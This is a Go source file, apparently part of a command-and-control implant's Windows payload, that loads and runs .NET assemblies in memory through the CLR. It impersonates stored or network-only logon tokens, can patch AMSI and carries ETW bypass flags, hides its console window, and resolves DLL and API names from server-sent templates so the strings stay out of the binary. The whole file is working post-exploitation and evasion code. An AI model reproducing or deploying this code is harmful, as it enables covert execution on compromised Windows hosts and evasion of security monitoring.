// server/docker/payloads/Windows/action_inline_assembly.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
	"unsafe"

	clr "github.com/almounah/go-buena-clr"
)

// Windows API Constants
const (
	STD_OUTPUT_HANDLE = ^uintptr(10) // -11
	STD_ERROR_HANDLE  = ^uintptr(11) // -12
	STD_INPUT_HANDLE  = ^uintptr(9)  // -10

	GENERIC_WRITE         = 0x40000000
	GENERIC_READ          = 0x80000000
	CREATE_ALWAYS         = 2
	FILE_ATTRIBUTE_NORMAL = 0x80
	OPEN_EXISTING         = 3

	FILE_MAP_ALL_ACCESS  = 0xF001F
	INVALID_HANDLE_VALUE = ^uintptr(0)

	// COM constants
	COINIT_APARTMENTTHREADED = 0x2
	COINIT_MULTITHREADED     = 0x0
)

// Windows error codes
const (
	ERROR_BROKEN_PIPE        = 109
	ERROR_PIPE_NOT_CONNECTED = 233
	ERROR_NO_DATA            = 232
)

// DLL name accessor functions (use template lookups)
func iaDllKernel32() string { return iaTpl(idxIADllKernel32) }
func iaDllOle32() string    { return iaTpl(idxIADllOle32) }
func iaDllUser32() string   { return iaTpl(idxIADllUser32) }
func iaDllMsvcrt() string   { return iaTpl(idxIADllMsvcrt) }

// API function name accessor functions (use template lookups)
func iaFnGetStdHandle() string          { return iaTpl(idxIAFnGetStdHandle) }
func iaFnSetStdHandle() string          { return iaTpl(idxIAFnSetStdHandle) }
func iaFnAllocConsole() string          { return iaTpl(idxIAFnAllocConsole) }
func iaFnFreeConsole() string           { return iaTpl(idxIAFnFreeConsole) }
func iaFnGetConsoleWindow() string      { return iaTpl(idxIAFnGetConsoleWindow) }
func iaFnPeekNamedPipe() string         { return iaTpl(idxIAFnPeekNamedPipe) }
func iaFnCreateFileW() string           { return iaTpl(idxIAFnCreateFileW) }
func iaFnCreateFileA() string           { return iaTpl(idxIAFnCreateFileA) }
func iaFnCloseHandle() string           { return iaTpl(idxIAFnCloseHandle) }
func iaFnReadFile() string              { return iaTpl(idxIAFnReadFile) }
func iaFnWriteFile() string             { return iaTpl(idxIAFnWriteFile) }
func iaFnCoInitializeEx() string        { return iaTpl(idxIAFnCoInitializeEx) }
func iaFnCoUninitialize() string        { return iaTpl(idxIAFnCoUninitialize) }
func iaFnFlushInstructionCache() string { return iaTpl(idxIAFnFlushInstructionCache) }
func iaFnShowWindow() string            { return iaTpl(idxIAFnShowWindow) }
func iaFnOpenOsfhandle() string         { return iaTpl(idxIAFnOpenOsfhandle) }
func iaFnDup2() string                  { return iaTpl(idxIAFnDup2) }
func iaFnClose() string                 { return iaTpl(idxIAFnClose) }

// InlineAssemblyTemplate indices (must match server's common.go)
const (
	// CLR strings
	idxIAClrV4      = 400
	idxIAClrV2      = 401
	idxIAClrV2Full  = 402
	idxIATempPrefix = 403
	idxIATempSuffix = 404

	// DLL names (800-803)
	idxIADllKernel32 = 800
	idxIADllOle32    = 801
	idxIADllUser32   = 802
	idxIADllMsvcrt   = 803

	// API function names (804-821)
	idxIAFnGetStdHandle          = 804
	idxIAFnSetStdHandle          = 805
	idxIAFnAllocConsole          = 806
	idxIAFnFreeConsole           = 807
	idxIAFnGetConsoleWindow      = 808
	idxIAFnPeekNamedPipe         = 809
	idxIAFnCreateFileW           = 810
	idxIAFnCreateFileA           = 811
	idxIAFnCloseHandle           = 812
	idxIAFnReadFile              = 813
	idxIAFnWriteFile             = 814
	idxIAFnCoInitializeEx        = 815
	idxIAFnCoUninitialize        = 816
	idxIAFnFlushInstructionCache = 817
	idxIAFnShowWindow            = 818
	idxIAFnOpenOsfhandle         = 819
	idxIAFnDup2                  = 820
	idxIAFnClose                 = 821
)

// Shared template storage for inline assembly
var (
	iaTemplate   []string
	iaTemplateMu sync.RWMutex
)

// SetInlineAssemblyTemplate sets the shared inline assembly template (called from command processing)
func SetInlineAssemblyTemplate(templates []string) {
	iaTemplateMu.Lock()
	iaTemplate = templates
	iaTemplateMu.Unlock()
	// Initialize Windows API after templates are set
	initIAWindowsAPI()
}

// iaTpl safely retrieves a template string by index
func iaTpl(idx int) string {
	iaTemplateMu.RLock()
	defer iaTemplateMu.RUnlock()
	if iaTemplate != nil && idx < len(iaTemplate) {
		return iaTemplate[idx]
	}
	return ""
}

// Convenience functions for CLR strings (use template lookups)
func iaClrV4() string      { return iaTpl(idxIAClrV4) }
func iaClrV2() string      { return iaTpl(idxIAClrV2) }
func iaClrV2Full() string  { return iaTpl(idxIAClrV2Full) }
func iaTempPrefix() string { return iaTpl(idxIATempPrefix) }
func iaTempSuffix() string { return iaTpl(idxIATempSuffix) }

// Windows API declarations (initialized in init to use hex strings)
var (
	kernel32DLL *syscall.LazyDLL
	ole32       *syscall.LazyDLL
	user32      *syscall.LazyDLL
	msvcrt      *syscall.LazyDLL

	// Console functions
	getStdHandle     *syscall.LazyProc
	setStdHandle     *syscall.LazyProc
	allocConsole     *syscall.LazyProc
	freeConsole      *syscall.LazyProc
	getConsoleWindow *syscall.LazyProc
	peekNamedPipe    *syscall.LazyProc

	// File functions
	createFileW *syscall.LazyProc
	createFileA *syscall.LazyProc
	closeHandle *syscall.LazyProc
	readFile    *syscall.LazyProc
	writeFile   *syscall.LazyProc

	// COM functions
	coInitializeEx        *syscall.LazyProc
	coUninitialize        *syscall.LazyProc
	flushInstructionCache *syscall.LazyProc

	// Window functions
	showWindow *syscall.LazyProc

	// CRT functions
	openOsfhandle *syscall.LazyProc
	dup2          *syscall.LazyProc
	closeFunc     *syscall.LazyProc
)

var iaInitOnce sync.Once

// initIAWindowsAPI initializes Windows API DLLs and procs using template values
func initIAWindowsAPI() {
	iaInitOnce.Do(func() {
		kernel32DLL = syscall.NewLazyDLL(iaDllKernel32())
		ole32 = syscall.NewLazyDLL(iaDllOle32())
		user32 = syscall.NewLazyDLL(iaDllUser32())
		msvcrt = syscall.NewLazyDLL(iaDllMsvcrt())

		getStdHandle = kernel32DLL.NewProc(iaFnGetStdHandle())
		setStdHandle = kernel32DLL.NewProc(iaFnSetStdHandle())
		allocConsole = kernel32DLL.NewProc(iaFnAllocConsole())
		freeConsole = kernel32DLL.NewProc(iaFnFreeConsole())
		getConsoleWindow = kernel32DLL.NewProc(iaFnGetConsoleWindow())
		peekNamedPipe = kernel32DLL.NewProc(iaFnPeekNamedPipe())

		createFileW = kernel32DLL.NewProc(iaFnCreateFileW())
		createFileA = kernel32DLL.NewProc(iaFnCreateFileA())
		closeHandle = kernel32DLL.NewProc(iaFnCloseHandle())
		readFile = kernel32DLL.NewProc(iaFnReadFile())
		writeFile = kernel32DLL.NewProc(iaFnWriteFile())

		coInitializeEx = ole32.NewProc(iaFnCoInitializeEx())
		coUninitialize = ole32.NewProc(iaFnCoUninitialize())
		flushInstructionCache = kernel32DLL.NewProc(iaFnFlushInstructionCache())

		showWindow = user32.NewProc(iaFnShowWindow())

		openOsfhandle = msvcrt.NewProc(iaFnOpenOsfhandle())
		dup2 = msvcrt.NewProc(iaFnDup2())
		closeFunc = msvcrt.NewProc(iaFnClose())
	})
}

// applyTokenContextForInlineAssembly applies token context for synchronous assembly execution
func applyTokenContextForInlineAssembly() func() {
	if globalTokenStore == nil {
		return func() {}
	}

	globalTokenStore.mu.RLock()
	defer globalTokenStore.mu.RUnlock()

	var cleanupFunc func()

	// Priority: Network-only token > Regular impersonation
	if globalTokenStore.NetOnlyHandle != 0 {

		// Apply the network-only token
		err := ImpersonateLoggedOnUser(globalTokenStore.NetOnlyHandle)
		if err == nil {
			cleanupFunc = func() {
				RevertToSelf()
			}
		} else {
		}
	} else if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken != "" {
		// Look up the token in the global store
		if token, exists := globalTokenStore.Tokens[globalTokenStore.ActiveToken]; exists {

			err := ImpersonateLoggedOnUser(token)
			if err == nil {
				cleanupFunc = func() {
					RevertToSelf()
				}
			} else {
			}
		}
	}

	if cleanupFunc == nil {
		return func() {} // No-op if no impersonation needed
	}

	return cleanupFunc
}

// executeWithFileCapture uses file redirection which is more stable than pipes
func executeWithFileCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context if needed
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	// Initialize COM
	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
	}

	// Create temp file for output
	tempDir := os.TempDir()
	outputFile := filepath.Join(tempDir, iaTempPrefix()+fmt.Sprintf("%d", time.Now().UnixNano())+iaTempSuffix())

	// Create file handle
	outputPath, _ := syscall.UTF16PtrFromString(outputFile)
	fileHandle, _, _ := createFileW.Call(
		uintptr(unsafe.Pointer(outputPath)),
		GENERIC_WRITE|GENERIC_READ,
		0x00000003, // FILE_SHARE_READ | FILE_SHARE_WRITE
		0,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		0,
	)

	if fileHandle == 0 || fileHandle == ^uintptr(0) {
		// Fallback to no capture
		return executeWithoutCapture(assemblyBytes, arguments)
	}
	defer closeHandle.Call(fileHandle)
	defer os.Remove(outputFile)

	// Save original handles
	origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
	origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)

	// Redirect to file
	setStdHandle.Call(STD_OUTPUT_HANDLE, fileHandle)
	setStdHandle.Call(STD_ERROR_HANDLE, fileHandle)

	// Also redirect Go's stdout/stderr
	oldStdout := os.Stdout
	oldStderr := os.Stderr

	outFile, err := os.OpenFile(outputFile, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0644)
	if err == nil {
		os.Stdout = outFile
		os.Stderr = outFile
		defer outFile.Close()
	}

	// Detect runtime
	targetRuntime := iaClrV4()
	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
		targetRuntime = iaClrV2()
	}

	// Execute assembly
	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	// Restore handles IMMEDIATELY
	setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
	setStdHandle.Call(STD_ERROR_HANDLE, origStderr)
	os.Stdout = oldStdout
	os.Stderr = oldStderr

	// Close file to flush
	if outFile != nil {
		outFile.Close()
	}
	closeHandle.Call(fileHandle)

	// Read output from file
	time.Sleep(100 * time.Millisecond) // Give time for flush
	output, _ := os.ReadFile(outputFile)

	return string(output), int(retCode), execErr
}

// executeWithoutCapture for maximum stability
func executeWithoutCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context if needed
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
	}

	targetRuntime := iaClrV4()
	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
		targetRuntime = iaClrV2()
	}

	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	return "", int(retCode), execErr
}

func (c *InlineAssemblyCommand) executeWindowsAssembly(assemblyBytes []byte, config struct {
	AssemblyB64 string   `json:"ab"`
	Arguments   []string `json:"ar"`
	AppDomain   string   `json:"ad"`
	BypassAMSI  bool     `json:"ba"`
	BypassETW   bool     `json:"be"`
	RevertETW   bool     `json:"re"`
	EntryPoint  string   `json:"ep"`
	UsePipe     bool     `json:"up"`
	PipeName    string   `json:"pm"`
}, executionNumber int) (string, int) {
	var output strings.Builder

	// Apply bypasses silently - removed verbose output
	if config.BypassAMSI {
		patchAMSI()
	}

	// Try synchronous capture first
	// &] Attempting synchronous capture")
	assemblyOutput, exitCode, err := executeWithSyncCapture(assemblyBytes, config.Arguments)

	if assemblyOutput == "" {
		// &] No output from sync capture, trying test capture")
		assemblyOutput, exitCode, err = executeWithTestCapture(assemblyBytes, config.Arguments)
	}

	if assemblyOutput != "" {
		output.WriteString("\n")
		output.WriteString(assemblyOutput)
		if !strings.HasSuffix(assemblyOutput, "\n") {
			output.WriteString("\n")
		}
	} else {
		output.WriteString(Succ(S18) + "\n")
	}

	if err != nil {
		output.WriteString("\n" + Err(E46) + "\n")
	}

	// Removed verbose output

	return output.String(), exitCode
}

// Simple synchronous version to avoid goroutine issues
func executeWithSyncCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	// &] executeWithSyncCapture: Starting")
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context BEFORE COM initialization
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	// NOW initialize COM under the impersonated context
	// &] Initializing COM")
	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
		// &] COM initialized")
	}

	// Create pipe with buffer
	var readPipe, writePipe syscall.Handle
	// &] Creating pipe")
	err := syscall.CreatePipe(&readPipe, &writePipe, nil, 1024*1024) // 1MB buffer
	if err != nil {
		// Detect runtime version
		targetRuntime := iaClrV4()
		if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
			targetRuntime = iaClrV2()
		}
		retCode, err := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)
		return "", int(retCode), err
	}
	defer syscall.CloseHandle(readPipe)
	// &] Pipe created successfully")

	// Check/create console
	consoleCreated := false
	if wnd, _, _ := getConsoleWindow.Call(); wnd == 0 {
		// &] Creating console")
		allocConsole.Call()
		consoleCreated = true
		if newWnd, _, _ := getConsoleWindow.Call(); newWnd != 0 {
			showWindow.Call(newWnd, SW_HIDE)
		}
	}

	// Save original handles
	// &] Saving original handles")
	origStdout, _, _ := getStdHandle.Call(STD_OUTPUT_HANDLE)
	origStderr, _, _ := getStdHandle.Call(STD_ERROR_HANDLE)

	// Redirect handles
	// &] Redirecting handles")
	setStdHandle.Call(STD_OUTPUT_HANDLE, uintptr(writePipe))
	setStdHandle.Call(STD_ERROR_HANDLE, uintptr(writePipe))

	// Critical: Redirect CRT file descriptors
	// &] Redirecting CRT file descriptors")
	fd, _, _ := openOsfhandle.Call(uintptr(writePipe), 0x8000)
	if fd != INVALID_HANDLE_VALUE {
		dup2.Call(fd, 1)
		dup2.Call(fd, 2)
		// &] CRT descriptors redirected")
	}

	// Detect runtime version
	targetRuntime := iaClrV4()
	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
		targetRuntime = iaClrV2()
	}

	// &] Executing assembly")
	// Execute the assembly
	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	// Close write pipe to signal EOF
	// &] Closing write pipe")
	syscall.CloseHandle(writePipe)

	// Now read all data from the pipe
	// &] Reading from pipe")
	var output bytes.Buffer
	buffer := make([]byte, 4096)

	for {
		var bytesAvail uint32
		var bytesRead uint32

		// Check if data is available
		ret, _, _ := peekNamedPipe.Call(
			uintptr(readPipe),
			0,
			0,
			0,
			uintptr(unsafe.Pointer(&bytesAvail)),
			0,
		)

		if ret == 0 || bytesAvail == 0 {
			break
		}


		// Read the available data
		ret, _, _ = readFile.Call(
			uintptr(readPipe),
			uintptr(unsafe.Pointer(&buffer[0])),
			uintptr(len(buffer)),
			uintptr(unsafe.Pointer(&bytesRead)),
			0,
		)

		if ret != 0 && bytesRead > 0 {
			output.Write(buffer[:bytesRead])
		} else {
			break
		}
	}

	// Restore handles
	// &] Restoring handles")
	setStdHandle.Call(STD_OUTPUT_HANDLE, origStdout)
	setStdHandle.Call(STD_ERROR_HANDLE, origStderr)

	// Clean up console
	if consoleCreated {
		freeConsole.Call()
	}

	result := output.String()
	// fmt.Printf("[DEBUG] Total output captured: %d bytes\n", len(result))

	return result, int(retCode), execErr
}

// Even simpler - just test if we can capture anything
func executeWithTestCapture(assemblyBytes []byte, arguments []string) (string, int, error) {
	// & TEST] Starting test capture")
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Apply token context if needed
	tokenCleanup := applyTokenContextForInlineAssembly()
	defer tokenCleanup()

	// Initialize COM
	hr, _, _ := coInitializeEx.Call(0, COINIT_MULTITHREADED)
	if hr == 0 {
		defer coUninitialize.Call()
	}

	// Detect runtime version
	targetRuntime := iaClrV4()
	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
		targetRuntime = iaClrV2()
	}

	// Test 1: Can we execute at all?
	// & TEST] Test 1: Direct execution")
	retCode, execErr := clr.ExecuteByteArray(targetRuntime, assemblyBytes, arguments)

	// The output we saw earlier suggests the assembly IS running
	// but Console.WriteLine is going somewhere else

	return Succ(S5), int(retCode), execErr
}

func verifyDirectoryAccess(path string) error {
	// Convert path to UTF16
	pathPtr, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}

	// Try to get file attributes (basic access check)
	attrs, err := syscall.GetFileAttributes(pathPtr)
	if err != nil {
		return fmt.Errorf(ErrCtx(E3, err.Error()))
	}

	if attrs == syscall.INVALID_FILE_ATTRIBUTES {
		return fmt.Errorf(Err(E3))
	}

	return nil
}
